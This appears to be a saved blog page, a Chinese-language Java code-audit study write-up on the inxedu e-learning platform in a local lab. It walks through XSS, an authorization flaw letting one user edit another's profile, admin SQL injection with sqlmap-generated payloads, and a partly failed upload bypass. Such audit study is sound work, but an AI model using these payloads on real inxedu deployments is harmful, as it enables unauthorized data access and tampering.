@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境搭建 下载源码（https:&#x2F;&#x2F;gitee.com&#x2F;inxeduopen&#x2F;inxedu ），导入idea  pom.xml 修改端口  project.properties 修改项目路径（修改为192.168.0.104的原因是让burpsuite能抓到包）    配置和结构maven结构 src&#x2F;main&#x2F;java 项目的源代码所在的目录 src&#x2F;main&#x2F;resources 项目的资源文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计学习（一）">
+<meta property="og:url" content="https://blog.b1ank.top/2021/09/05/inxedu/index.html">
+<meta property="og:site_name" content="b1ank&#39;s blog">
+<meta property="og:description" content="环境搭建 下载源码（https:&#x2F;&#x2F;gitee.com&#x2F;inxeduopen&#x2F;inxedu ），导入idea  pom.xml 修改端口  project.properties 修改项目路径（修改为192.168.0.104的原因是让burpsuite能抓到包）    配置和结构maven结构 src&#x2F;main&#x2F;java 项目的源代码所在的目录 src&#x2F;main&#x2F;resources 项目的资源文件">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905124008702.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905134305748.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905134321938.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905134346083.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905135306583.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905144455646.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905122551982.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905122513011.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905122459123.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905165637874.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905170811389.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905171111690.png">
+<meta property="og:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905174927620.png">
+<meta property="article:published_time" content="2021-09-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-05T10:22:44.682Z">
+<meta property="article:author" content="b1ank">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.b1ank.top/2021/09/05/inxedu/image-20210905124008702.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java代码审计学习（一）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post " href="/2021/08/20/weblogic/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/09/05/inxedu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/09/05/inxedu/&text=Java代码审计学习（一）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/09/05/inxedu/&is_video=false&description=Java代码审计学习（一）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计学习（一）&body=Check out this article: https://blog.b1ank.top/2021/09/05/inxedu/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/09/05/inxedu/&name=Java代码审计学习（一）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/09/05/inxedu/&t=Java代码审计学习（一）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%92%8C%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">配置和结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#maven%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">maven结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml"><span class="toc-number">2.2.</span> <span class="toc-text">pom.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-xml"><span class="toc-number">2.3.</span> <span class="toc-text">web.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-mvc-xml"><span class="toc-number">2.4.</span> <span class="toc-text">Spring-mvc.xml</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0xss%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">前台xss漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">越权漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">后台sql注入漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Java代码审计学习（一）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b1ank</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol>
+<li><p>下载源码（<a target="_blank" rel="noopener" href="https://gitee.com/inxeduopen/inxedu">https://gitee.com/inxeduopen/inxedu</a> ），导入idea</p>
+</li>
+<li><p>pom.xml 修改端口</p>
+</li>
+<li><p>project.properties 修改项目路径（修改为192.168.0.104的原因是让burpsuite能抓到包）</p>
+</li>
+</ol>
+<p><img src="/2021/09/05/inxedu/image-20210905124008702.png" alt="image-20210905124008702"></p>
+<h3 id="配置和结构"><a href="#配置和结构" class="headerlink" title="配置和结构"></a>配置和结构</h3><h4 id="maven结构"><a href="#maven结构" class="headerlink" title="maven结构"></a>maven结构</h4><ul>
+<li><code>src/main/java</code> 项目的源代码所在的目录</li>
+<li><code>src/main/resources</code> 项目的资源文件所在的目录</li>
+<li><code>src/main/filters</code> 项目的资源过滤文件所在的目录</li>
+<li><code>src/main/webapp</code> 如果是web项目，则该目录是web应用源代码所在的目录，比如html文件和web.xml等都在该目录下</li>
+</ul>
+<h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><p>POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p>
+<h4 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h4><p>配置欢迎页、404、filter、servlet等等。</p>
+<h4 id="Spring-mvc-xml"><a href="#Spring-mvc-xml" class="headerlink" title="Spring-mvc.xml"></a>Spring-mvc.xml</h4><p>配置注解、前后台拦截等等</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="前台xss漏洞"><a href="#前台xss漏洞" class="headerlink" title="前台xss漏洞"></a>前台xss漏洞</h4><p>通过在<code>WEB-INF</code>搜索一些关键字来找一些输出点，发现部分输出点参数可控，并且没有经过过滤。</p>
+<p><img src="/2021/09/05/inxedu/image-20210905134305748.png" alt="image-20210905134305748"></p>
+<p>更新用户信息处<code>src/main/java/com/inxedu/os/edu/controller/user/UserController.java</code> </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/updateUser&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">updateUserInfo</span><span class="params">(HttpServletRequest request,<span class="meta">@ModelAttribute(&quot;user&quot;)</span> User user)</span></span>&#123;</span><br><span class="line">   Map&lt;String,Object&gt; json = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line">   <span class="keyword">try</span>&#123;</span><br><span class="line">      userService.updateUser(user);</span><br><span class="line">      json = <span class="keyword">this</span>.setJson(<span class="keyword">true</span>, <span class="string">&quot;修改成功&quot;</span>, user);</span><br><span class="line">      <span class="comment">//缓存用户</span></span><br><span class="line">      userService.setLoginInfo(request,user.getUserId(),<span class="string">&quot;false&quot;</span>);</span><br><span class="line">   &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setAjaxException(json);</span><br><span class="line">      logger.error(<span class="string">&quot;updateUserInfo()---error&quot;</span>,e);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> json;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/05/inxedu/image-20210905134321938.png" alt="image-20210905134321938"></p>
+<p><img src="/2021/09/05/inxedu/image-20210905134346083.png" alt="image-20210905134346083"></p>
+<p>搜索课程处<code>src/main/java/com/inxedu/os/edu/controller/course/CourseController.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 课程列表展示,搜索课程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/front/showcoulist&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">showCourseList</span><span class="params">(HttpServletRequest request, <span class="meta">@ModelAttribute(&quot;page&quot;)</span> PageEntity page, <span class="meta">@ModelAttribute(&quot;queryCourse&quot;)</span> QueryCourse queryCourse)</span> </span>&#123;</span><br><span class="line">        ModelAndView model = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	model.setViewName(showCourseList);</span><br><span class="line">            <span class="comment">// 页面传来的数据放到page中</span></span><br><span class="line">        	page.setPageSize(<span class="number">12</span>);</span><br><span class="line">            <span class="comment">//只查询上架的</span></span><br><span class="line">            queryCourse.setIsavaliable(<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 搜索课程列表</span></span><br><span class="line">            List&lt;CourseDto&gt; courseList = courseService.queryWebCourseListPage(queryCourse, page);</span><br><span class="line">            model.addObject(<span class="string">&quot;courseList&quot;</span>, courseList);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 查询所有1级专业</span></span><br><span class="line">            QuerySubject querySubject = <span class="keyword">new</span> QuerySubject();</span><br><span class="line">            querySubject.setParentId(<span class="number">0</span>);</span><br><span class="line">            List&lt;Subject&gt; subjectList = subjectService.getSubjectList(querySubject);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="comment">//根据条件专业查询 所有的子专业</span></span><br><span class="line">            <span class="keyword">if</span> (ObjectUtils.isNotNull(queryCourse.getSubjectId())) &#123;</span><br><span class="line">                Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">                subject.setSubjectId(queryCourse.getSubjectId());</span><br><span class="line">                subject = subjectService.getSubjectBySubject(subject);</span><br><span class="line">                <span class="comment">//查询子专业</span></span><br><span class="line">                List&lt;Subject&gt; sonSubjectList = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (subject.getParentId() != <span class="number">0</span>) &#123;<span class="comment">//如果条件为二级专业（根据父级id，查询所有的子级）</span></span><br><span class="line">                    sonSubjectList = subjectService.getSubjectListByOne(Long.valueOf(subject.getParentId()));</span><br><span class="line">                    model.addObject(<span class="string">&quot;subjectParentId&quot;</span>, subject.getParentId());<span class="comment">//父级id</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果条件为一级专业（根据id，查询所有的子级）</span></span><br><span class="line">                    sonSubjectList = subjectService.getSubjectListByOne(Long.valueOf(subject.getSubjectId()));</span><br><span class="line">                &#125;</span><br><span class="line">                model.addObject(<span class="string">&quot;sonSubjectList&quot;</span>, sonSubjectList);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 全部教师</span></span><br><span class="line">            QueryTeacher query = <span class="keyword">new</span> QueryTeacher();</span><br><span class="line">            List&lt;Teacher&gt; teacherList =teacherService.queryTeacherList(query);</span><br><span class="line">            </span><br><span class="line">            model.addObject(<span class="string">&quot;page&quot;</span>,page);</span><br><span class="line">            model.addObject(<span class="string">&quot;queryCourse&quot;</span>, queryCourse);</span><br><span class="line">            model.addObject(<span class="string">&quot;teacherList&quot;</span>, teacherList);</span><br><span class="line">            model.addObject(<span class="string">&quot;subjectList&quot;</span>, subjectList);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        	model.setViewName(<span class="keyword">this</span>.setExceptionRequest(request, e));</span><br><span class="line">            logger.error(<span class="string">&quot;showCourseList()--error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/05/inxedu/image-20210905135306583.png" alt="image-20210905135306583"></p>
+<p><img src="/2021/09/05/inxedu/image-20210905144455646.png" alt="image-20210905144455646"></p>
+<h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><p>在刚刚的更新用户信息处<br><code>src/main/java/com/inxedu/os/edu/controller/user/UserController.java</code> ，对用户的权限没有进行判断，修改<code>user.userId</code>可修改他人信息。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/updateUser&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">updateUserInfo</span><span class="params">(HttpServletRequest request,<span class="meta">@ModelAttribute(&quot;user&quot;)</span> User user)</span></span>&#123;</span><br><span class="line">	Map&lt;String,Object&gt; json = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		userService.updateUser(user);</span><br><span class="line">		json = <span class="keyword">this</span>.setJson(<span class="keyword">true</span>, <span class="string">&quot;修改成功&quot;</span>, user);</span><br><span class="line">		<span class="comment">//缓存用户</span></span><br><span class="line">		userService.setLoginInfo(request,user.getUserId(),<span class="string">&quot;false&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		<span class="keyword">this</span>.setAjaxException(json);</span><br><span class="line">		logger.error(<span class="string">&quot;updateUserInfo()---error&quot;</span>,e);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> json;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">	userDao.updateUser(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="后台sql注入漏洞"><a href="#后台sql注入漏洞" class="headerlink" title="后台sql注入漏洞"></a>后台sql注入漏洞</h4><p>在登录后台的时候，getLocalHost函数会报错，需要修改本地host。</p>
+<p><img src="/2021/09/05/inxedu/image-20210905122551982.png" alt="image-20210905122551982"></p>
+<p><img src="/2021/09/05/inxedu/image-20210905122513011.png" alt="image-20210905122513011"></p>
+<p><img src="/2021/09/05/inxedu/image-20210905122459123.png" alt="image-20210905122459123"></p>
+<p>在<code>mybatis</code>文件夹下搜索<code>$</code>符号，发现部分sql语句存在直接拼接，直接用sqlmap。</p>
+<p><code>src/main/resources/mybatis/inxedu/article/ArticleMapper.xml</code>处：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 删除文章 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteArticleByIds&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">DELETE FROM EDU_ARTICLE WHERE EDU_ARTICLE.ARTICLE_ID IN ($&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: #1* ((custom) POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span><br><span class="line">    Payload: articelId&#x3D;2) AND 4484&#x3D;(SELECT (CASE WHEN (4484&#x3D;4484) THEN 4484 ELSE (SELECT 2521 UNION SELECT 3040) END))-- -</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: articelId&#x3D;2) AND GTID_SUBSET(CONCAT(0x716b6a7171,(SELECT (ELT(9854&#x3D;9854,1))),0x71786a6271),9854)-- WcSf</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)</span><br><span class="line">    Payload: articelId&#x3D;2) AND 1394&#x3D;BENCHMARK(5000000,MD5(0x52527851))-- dXOf</span><br><span class="line">---</span><br><span class="line">[12:44:34] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br></pre></td></tr></table></figure>
+
+<p><code>src/main/resources/mybatis/inxedu/course/CourseKpointMapper.xml</code>处：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 删除视频节点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteKpointByIds&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">DELETE FROM EDU_COURSE_KPOINT where EDU_COURSE_KPOINT.KPOINT_ID IN($&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: #1* (URI)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: http:&#x2F;&#x2F;192.168.0.104:8080&#x2F;admin&#x2F;kpoint&#x2F;deletekpoint&#x2F;(SELECT (CASE WHEN (4331&#x3D;4331) THEN 65 ELSE (SELECT 6797 UNION SELECT 8292) END)),</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: http:&#x2F;&#x2F;192.168.0.104:8080&#x2F;admin&#x2F;kpoint&#x2F;deletekpoint&#x2F;65 AND (SELECT 1279 FROM (SELECT(SLEEP(5)))thAc),</span><br><span class="line">---</span><br><span class="line">[13:07:55] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.0.12</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><code>/src/main/webapp/WEB-INF/lib/inxedu-jar.jar!/com/inxedu/os/common/controller/ImageUploadController.class</code>处，各种上传头像处都有白名单验证，但是白名单（除了jsp）可控</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fileType.contains(ext) &amp;&amp; !<span class="string">&quot;jsp&quot;</span>.equals(ext)) &#123;</span><br><span class="line">    String filePath = <span class="keyword">this</span>.getPath(request, ext, param);</span><br><span class="line">    File file = <span class="keyword">new</span> File(<span class="keyword">this</span>.getProjectRootDirPath(request) + filePath);</span><br><span class="line">    <span class="keyword">if</span> (!file.getParentFile().exists()) &#123;</span><br><span class="line">        file.getParentFile().mkdirs();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uploadfile.transferTo(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.responseData(filePath, <span class="number">0</span>, <span class="string">&quot;上传成功&quot;</span>, response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.responseErrorData(response, <span class="number">1</span>, <span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试jspx</p>
+<p><img src="/2021/09/05/inxedu/image-20210905165637874.png" alt="image-20210905165637874"></p>
+<p><img src="/2021/09/05/inxedu/image-20210905170811389.png" alt="image-20210905170811389"></p>
+<p>很遗憾，可能需要配置某些东西来解析jspx，以后学会了在看</p>
+<p><img src="/2021/09/05/inxedu/image-20210905171111690.png" alt="image-20210905171111690"></p>
